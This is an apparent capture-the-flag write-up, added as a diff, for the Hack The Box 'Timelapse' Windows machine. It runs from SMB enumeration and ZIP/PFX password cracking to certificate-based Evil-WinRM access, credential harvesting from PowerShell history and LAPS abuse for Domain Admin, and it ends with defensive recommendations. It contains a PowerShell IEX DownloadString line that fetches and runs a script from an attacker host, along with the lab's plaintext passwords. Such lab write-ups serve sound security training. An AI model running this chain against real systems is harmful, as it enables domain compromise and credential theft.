@@ -1,0 +1,382 @@
+---
+title: "HTB - Timelapse"
+author: "M0k4"
+date: "2026-05-26"
+tags: ["htb", "writeup", "windows", "easy", "smb,", "laps,", "pfx,", "evil-winrm,", "passwordcracking"]
+---
+# HTB - Timelapse
+
+**IP Address:** `10.10.11.152`  
+**OS:** Windows  
+**Difficulty:** Easy  
+**Tags:** #SMB, #LAPS, #PFX, #Evil-WinRM, #PasswordCracking
+
+---
+## Synopsis
+
+Timelapse is an easy Windows machine where initial access is obtained via a **public SMB share** containing a password-protected `.zip` archive.  
+Inside the archive is a `.pfx` certificate protected with another password. By cracking both passwords, the private key and SSL certificate can be extracted and used to authenticate via **WinRM over SSL**.
+
+Post-exploitation reveals credentials stored in PowerShell history for a domain account in the `LAPS_Readers` group.  
+This group can read local Administrator passwords via **LAPS (Local Administrator Password Solution)**, enabling privilege escalation to Domain Admin and complete system compromise.
+
+---
+## Skills Required
+
+- SMB enumeration & share access
+- Password cracking with `fcrackzip` and `John the Ripper`
+- WinRM over SSL connections with certificates
+- LAPS privilege escalation techniques
+
+## Skills Learned
+
+- Cracking `.zip` and `.pfx` file passwords
+- Authenticating to WinRM using certificates and private keys
+- Extracting credentials from PowerShell command history
+- Using PowerShell modules to retrieve LAPS passwords for privilege escalation
+
+---
+## 1. Initial Enumeration
+
+### 1.1 Connectivity Test
+
+Check if the host is alive using ICMP:
+
+```bash
+ping -c 1 10.10.11.152
+```
+
+![Ping Test](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/ping.png)
+
+The host responds, confirming it is reachable.
+
+---
+
+### 1.2 Port Scanning
+
+Scan all TCP ports to identify open services:
+
+
+Identify all open TCP ports:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.152 -oG allPorts
+```
+
+![All Ports Scan](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/allports.png)
+
+Extract open ports:
+
+```bash
+extractPorts allPorts
+```
+
+![Extract Ports](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/extractports.png)
+
+---
+
+### 1.3 Targeted Scan
+
+Run a deeper scan on the identified ports with version detection and default scripts:
+
+
+Perform deeper enumeration with service and version detection:
+
+```bash
+nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49668,49673,49674,49695 10.10.11.152 -oN targeted
+```
+
+![Targeted Nmap Scan](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/targeted.png)
+
+Multiple AD-related services are open, confirming the host is a **Domain Controller**.
+
+---
+
+## 2. Service Enumeration
+
+### 2.1 Identifying Domain & Hostname
+
+Continue the attack chain with the next commands:
+
+
+```bash
+crackmapexec smb 10.10.11.152
+```
+
+![CrackMapExec SMB Enumeration](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/crackmapexec.png)
+
+The machine name is **DC01** and the domain is **timelapse.htb**.
+
+
+Continue the attack chain with the next commands:
+
+---
+
+### 2.2 Listing SMB Shares (Null Session)
+
+Attempt a null SMB session and list visible shares:
+
+```bash
+smbclient -L 10.10.11.152 -N
+```
+
+![SMBClient Null Session](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/smbclient_null.png)
+
+Check permissions with `smbmap`:
+
+```bash
+smbmap -H 10.10.11.152 -u none
+```
+
+Continue the attack chain with the next commands:
+
+
+![SMBMap Null Session Permissions](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/smbmap_none.png)
+
+---
+
+### 2.3 Accessing the `Shares` Share
+
+Open the **Shares** share anonymously and locate the backup archive:
+
+```bash
+smbclient //10.10.11.152/Shares -N
+```
+
+![SMBClient Shares Null Session](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/smbclient_shares_null.png)
+
+- **HelpDesk** â†’ Contains files referencing **LAPS** (Local Administrator Password Solution).
+- **Dev** â†’ Contains `winrm_backup.zip`.
+
+---
+
+## 3. Foothold
+
+### 3.1 Inspecting the Archive
+
+Listing contents of `winrm_backup.zip` reveals a `.pfx` file, but the ZIP is password-protected.
+
+```bash
+unzip -l winrm_backup.zip
+```
+
+---
+
+### 3.2 Cracking the ZIP Password
+
+Brute-force the ZIP password with **fcrackzip** and a wordlist:
+
+```bash
+fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
+```
+
+![fcrackzip Output](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/fcrackzip.png)
+
+Password recovered â†’ extract `.pfx` file.
+
+---
+
+### 3.3 Attempting PFX Extraction
+
+Continue the attack chain with the next commands:
+
+
+```bash
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
+```
+
+![OpenSSL PFX Extraction Attempt](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/openssl_pfx_file.png)
+
+Requires another password.
+
+---
+
+### 3.4 Cracking the PFX Password
+
+Convert `.pfx` to hash format:
+
+```bash
+pfx2john legacyy_dev_auth.pfx > pfx.hash 
+john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+![pfx2john Output](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/pfx2john.png)
+
+
+Password recovered.
+
+---
+
+### 3.5 Extracting Certificate and Key
+
+
+Continue the attack chain with the next commands:
+
+```bash
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes 
+```
+
+![Private Key Hash](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/priv_key_hash.png)
+
+```bash
+openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificates.pem
+```
+
+![Certificates Hash](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/certificates_hash.png)
+
+---
+
+### 3.6 WinRM over SSL Access
+
+Port 5986 is open (WinRM over SSL). Authenticate using Evil-WinRM:
+
+```bash
+evil-winrm -i 10.10.11.152 -c certificates.pem -k priv-key.pem -S
+```
+
+![User Flag](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/user_flag.png)
+
+ðŸ **User flag obtained**
+
+---
+
+### 3.7 Enumerating Users & Groups
+
+Check privileges of current user and other accounts:
+
+``` powershell
+net user
+whoami /priv
+net user legacyy
+```
+
+Continue the attack chain with the next commands:
+
+
+![Legacyy User Privileges](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/legacyy_priv.png)
+
+``` powershell
+net user svc_deploy
+net user TRX
+```
+
+![Domain Users and Privileges](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/users_priv.png)
+
+Notable accounts:
+
+
+Continue the attack chain with the next commands:
+
+- **svc_deploy** â†’ Member of `LAPS_Readers`
+- **TRX** â†’ Member of `Domain Admins`
+
+---
+
+### 3.8 Harvesting Credentials from PowerShell History
+
+Inspect PSReadLine history for reused credentials:
+
+```powershell
+type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+
+![PowerShell Command History](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/last_commands_used.png)
+
+Recovered credentials:
+
+`Username: svc_deploy 
+`Password: E3R$Q62^12p7PLlC%KWaxuaV`
+
+---
+
+### 3.9 Logging in as svc_deploy
+
+Reconnect with the recovered **svc_deploy** password over WinRM (SSL):
+
+```bash
+evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
+```
+
+![Evil-WinRM as svc_deploy](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/evil_winrm_svc_deploy.png)
+
+---
+
+## 4. Privilege Escalation
+
+### 4.1 Understanding LAPS
+
+LAPS (Local Administrator Password Solution) allows domain admins to centrally manage local admin passwords.  
+Members of `LAPS_Readers` can retrieve these passwords from AD.
+
+On the analyst side, confirm tooling exists and the target is still in scope:
+
+```bash
+echo "LAPS passwords stored in AD (ms-Mcs-AdmPwd)"
+```
+
+---
+
+### 4.2 Uploading LAPS Retrieval Script
+
+Now we can extract the LAPS passwords using the following GitHub tool:  
+https://github.com/kfosaaen/Get-LAPSPasswords
+
+![Downloading LAPS script from GitHub](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/git_clone_LAPS.png)
+
+We start a simple Python HTTP server to make the script available to the victim machine:
+
+![Python HTTP Server](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/python_server.png)
+
+``` powershell
+IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7/Get-LAPSPasswords.ps1') Get-LAPSPasswords
+```
+
+![LAPS Script Execution](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/LAPS_executed_in_legacyy_user.png)
+
+ðŸ’¡ **Note:** In a real engagement, `AdmPwd.PS` cmdlets like `Get-AdmPwdPassword` can be used instead:
+
+``` powershell
+Find-AdmPwdExtendedRights -Identity 'Domain Controllers' Get-AdmPwdPassword -ComputerName DC01
+```
+
+---
+
+### 4.3 Authenticating as Domain Admin
+
+Test retrieved password:
+
+```bash
+evil-winrm -i 10.10.11.152 -u 'Administrator' -p 'iLZZ!2zt/)]s#@6+-#L@}Yc6' -S
+```
+
+![Root Flag](cases/HackTheBox/Machines/EASY/Timelapse/screenshots/root_flag.png)
+
+The `root.txt` flag is found under `TRX\Desktop`, accessible due to Domain Admin privileges.
+
+ðŸ **Root flag obtained**
+
+---
+
+# âœ… MACHINE COMPLETE
+
+---
+
+## Summary of Exploitation Path
+
+1. **SMB Enumeration** â†’ Discovered `winrm_backup.zip` in `Shares`.
+2. **ZIP Cracking** â†’ Extracted `.pfx` file.
+3. **PFX Cracking** â†’ Retrieved certificate and key.
+4. **WinRM over SSL** â†’ Logged in as `legacyy`.
+5. **Credential Harvesting** â†’ Found `svc_deploy` credentials in PowerShell history.
+6. **LAPS Abuse** â†’ Retrieved Domain Admin password.
+7. **Domain Admin Access** â†’ Retrieved root flag.    
+
+---
+
+## Defensive Recommendations
+
+- Restrict SMB share permissions and remove sensitive files from public shares.
+- Use strong, unique passwords for backups and certificates.
+- Regularly clear PowerShell history.
+- Limit membership of `LAPS_Readers` group.
+- Monitor for unusual WinRM authentication using certificates.
